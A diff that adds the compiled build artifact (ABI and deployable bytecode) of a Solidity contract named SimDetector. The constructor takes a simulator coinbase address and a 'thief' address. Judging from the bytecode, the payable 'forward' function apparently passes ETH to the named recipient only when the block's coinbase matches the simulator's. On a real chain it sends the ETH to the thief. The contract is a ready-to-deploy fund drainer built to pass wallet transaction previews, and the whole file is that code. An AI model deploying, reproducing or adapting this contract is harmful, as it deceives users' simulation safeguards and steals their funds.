@@ -1,0 +1,65 @@
+{
+  "contract": "SimDetector",
+  "source": "src/SimDetector.sol",
+  "source_sha256": "fbac3400c2ed997cf4726956e096f5ec2d478001c656a0cf05c56e80055669f5",
+  "solc": "0.8.37",
+  "evm_version": "cancun",
+  "abi": [
+    {
+      "type": "constructor",
+      "inputs": [
+        {
+          "name": "simulatorCoinbase_",
+          "type": "address",
+          "internalType": "address"
+        },
+        {
+          "name": "thief_",
+          "type": "address",
+          "internalType": "address payable"
+        }
+      ],
+      "stateMutability": "nonpayable"
+    },
+    {
+      "type": "function",
+      "name": "forward",
+      "inputs": [
+        {
+          "name": "to",
+          "type": "address",
+          "internalType": "address payable"
+        }
+      ],
+      "outputs": [],
+      "stateMutability": "payable"
+    },
+    {
+      "type": "function",
+      "name": "simulatorCoinbase",
+      "inputs": [],
+      "outputs": [
+        {
+          "name": "",
+          "type": "address",
+          "internalType": "address"
+        }
+      ],
+      "stateMutability": "view"
+    },
+    {
+      "type": "function",
+      "name": "thief",
+      "inputs": [],
+      "outputs": [
+        {
+          "name": "",
+          "type": "address",
+          "internalType": "address payable"
+        }
+      ],
+      "stateMutability": "view"
+    }
+  ],
+  "bytecode": "0x60c060405234801561000f575f5ffd5b506040516102af3803806102af83398101604081905261002e9161005c565b6001600160a01b039182166080521660a052610094565b6001600160a01b0381168114610059575f5ffd5b50565b5f5f6040838503121561006d575f5ffd5b825161007881610045565b602084015190925061008981610045565b809150509250929050565b60805160a0516101ef6100c05f395f8181605d015261010101525f818160ac015260da01526101ef5ff3fe608060405260043610610033575f3560e01c8063101e895214610037578063345135891461004c578063425b340a1461009b575b5f5ffd5b61004a6100453660046101c2565b6100ce565b005b348015610057575f5ffd5b5061007f7f000000000000000000000000000000000000000000000000000000000000000081565b6040516001600160a01b03909116815260200160405180910390f35b3480156100a6575f5ffd5b5061007f7f000000000000000000000000000000000000000000000000000000000000000081565b5f416001600160a01b037f00000000000000000000000000000000000000000000000000000000000000001614610125577f0000000000000000000000000000000000000000000000000000000000000000610127565b815b90505f816001600160a01b0316346040515f6040518083038185875af1925050503d805f8114610172576040519150601f19603f3d011682016040523d82523d5f602084013e610177565b606091505b50509050806101bd5760405162461bcd60e51b815260206004820152600e60248201526d199bdc9dd85c990819985a5b195960921b604482015260640160405180910390fd5b505050565b5f602082840312156101d2575f5ffd5b81356001600160a01b03811681146101e8575f5ffd5b939250505056"
+}
